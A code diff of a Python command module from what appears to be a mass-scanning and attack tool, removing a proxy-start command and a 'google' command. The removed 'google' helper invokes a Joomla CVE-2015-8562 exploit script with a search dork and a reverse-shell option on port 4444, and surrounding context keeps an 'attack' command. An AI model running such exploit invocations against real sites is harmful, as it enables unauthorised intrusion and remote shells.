@@ -5,7 +5,6 @@
 handles user commands
 '''
 import os
-import subprocess
 import sys
 
 from lib.cli import colors, console, futil
@@ -122,6 +121,7 @@ def run_info(**kwargs):
     session.read_config()
 
     # check pool
+
     if session.dynamic_proxy('test'):
         session.proxy_status = "OK"
     else:
@@ -202,40 +202,6 @@ def run_target(**kwargs):
         '[i] Target list changed to {}'.format(target), colors.BLUE)
     session.ip_list = session.init_dir + \
         '/data/' + target
-
-
-def run_proxy(**kwargs):
-    """
-    Start ss-proxy
-    """
-    session = kwargs.get("session")
-
-    session.shadowsocks.start_ss_proxy()
-
-    # write proxy.conf
-    proxyconf = open(session.proxy_conf, "w+")
-    proxyconf.write(session.proxychains_conf)
-    proxyconf.close()
-
-    # set proxy_status
-    session.proxy_status = "DISCONNECTED"
-
-
-def run_google(**kwargs):
-    """
-    Search via google
-    """
-    dork = kwargs.get("args")[0]
-
-    try:
-        # well yes im a lazy guy
-        subprocess.call(['./exploits/joomla/joomlaCVE-2015-8562.py',
-                         '--dork', dork,
-                         '--revshell=\'127.0.0.1\'',
-                         '--port=4444'])
-    except BaseException as err:
-        console.print_error(str(err))
-        console.debug_except()
 
 
 def run_zoomeye(**kwargs):
@@ -417,20 +383,6 @@ def cmds_init(session):
                         session=session,
                         helper=run_baidu)
     COMMANDS.update({"baidu": baidu_cmd})
-
-    # proxy
-    proxy_cmd = Command(names=["proxy"],
-                        doc="Start ss-proxy using ./data/ss.json config",
-                        session=session,
-                        helper=run_proxy)
-    COMMANDS.update({"proxy": proxy_cmd})
-
-    # google
-    google_cmd = Command(names=["google"],
-                         doc="Fetch URLs from Google using custom dork",
-                         session=session,
-                         helper=run_google)
-    COMMANDS.update({"google": google_cmd})
 
     # attack
     attack_cmd = Command(names=["start", "a", "attack"],
